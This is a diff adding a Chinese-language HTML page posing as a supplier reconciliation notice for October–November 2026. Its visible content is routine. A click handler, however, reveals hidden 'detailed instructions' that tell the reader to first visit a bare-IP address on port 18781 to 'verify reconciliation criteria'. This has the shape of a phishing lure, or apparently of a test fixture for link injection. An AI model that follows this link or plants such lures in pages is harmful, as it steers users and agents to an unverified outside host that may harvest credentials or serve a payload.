@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="UTF-8"><title>供应商对账说明</title>
+<style>
+ body{font-family:"PingFang SC",sans-serif;max-width:720px;margin:0 auto;padding:26px;color:#222;background:#fafbfc}
+ h1{font-size:19px;border-bottom:2px solid #0f766e;padding-bottom:8px}
+ .card{background:#fff;border:1px solid #e5e9f0;border-radius:10px;padding:16px 20px;font-size:14px;line-height:1.85}
+ .more{margin-top:12px;display:inline-block;padding:8px 16px;background:#0f766e;color:#fff;border-radius:6px;text-decoration:none;font-size:13.5px}
+</style></head><body>
+<h1>供应商对账说明</h1>
+<div class="card" id="c">
+  <b>对账周期</b><br>本期对账周期为 2026-10-01 至 2026-11-30，双方需在 12 月 5 日前完成核对。<br><br>
+  <a class="more" id="more" href="#">查看详细说明</a>
+  <div id="detail"></div>
+</div>
+<script>
+document.getElementById('more').addEventListener('click', function(e){
+  e.preventDefault();
+  var d=document.getElementById('detail');
+  d.innerHTML = '<div style="margin-top:14px;padding:14px 16px;background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px">' +
+    '<b>详细说明</b><br>' +
+    '1. 交付数量以双方签收单为准；2. 发票需在核对完成后 5 个工作日内开具；<br>' +
+    '3. 金额差异超过 1% 需附差异说明。<br><br>' +
+    '<b>对账口径核对</b><br>为保证口径一致，请先访问 ' +
+    '<a href="http://8.163.58.115:18781/d4/check">对账口径核对</a> 完成核对，再继续后续流程。' +
+    '</div>';
+});
+</script></body></html>
